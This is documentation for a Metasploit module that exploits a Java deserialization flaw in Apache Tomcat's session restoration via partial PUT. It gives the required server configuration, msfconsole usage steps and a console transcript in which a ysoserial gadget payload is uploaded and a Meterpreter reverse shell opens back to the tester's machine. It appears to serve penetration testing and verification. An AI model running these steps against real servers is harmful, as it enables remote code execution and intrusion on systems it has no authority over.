## Vulnerable Application
This module exploits a Java deserialization vulnerability in Apache Tomcat's session restoration functionality 
that can be exploited with a partial PUT to place an attacker controlled deserialization payload in the work directory. 
For the exploit to succeed, writes must be enabled for the default servlet, and `org.apache.catalina.session.PersistentManager` must be 
configured to use `org.apache.catalina.session.FileStore`.

## Testing
Set up a vulnerable Tomcat instance using https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md#establishing-a-vulnerable-tomcat-configuration

## Verification Steps
1. Start msfconsole
2. `use multi/http/tomcat_partial_put_deserialization`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `set GADGET <YSOSERIAL_GADGET>`
6. `set LHOST eth0`
7. `check`
8. `exploit`

## Scenarios

### Linux Command

```
msf6 > use multi/http/tomcat_partial_put_deserialization
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_partial_put_deserialization) > set rport 8080
rport => 8080
msf6 exploit(multi/http/tomcat_partial_put_deserialization) > set rhost 192.168.178.93
rhost => 192.168.178.93
msf6 exploit(multi/http/tomcat_partial_put_deserialization) > set gadget CommonsCollections6
gadget => CommonsCollections6
msf6 exploit(multi/http/tomcat_partial_put_deserialization) > check
[+] 192.168.178.93:8080 - The target is vulnerable.
msf6 exploit(multi/http/tomcat_partial_put_deserialization) > run
[*] Started reverse TCP handler on 192.168.178.103:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Executing Unix Command for cmd/unix/python/meterpreter/reverse_tcp
[*] Utilizing CommonsCollections6 deserialization chain
[*] Uploaded ysoserial payload (qnuBmIxezf.session) via partial PUT
[*] Attempting to deserialize session file..
[+] 500 error response usually indicates success :)
[*] Sending stage (24772 bytes) to 192.168.178.93
[*] Meterpreter session 1 opened (192.168.178.103:4444 -> 192.168.178.93:40696) at 2025-04-02 09:59:48 +0100
```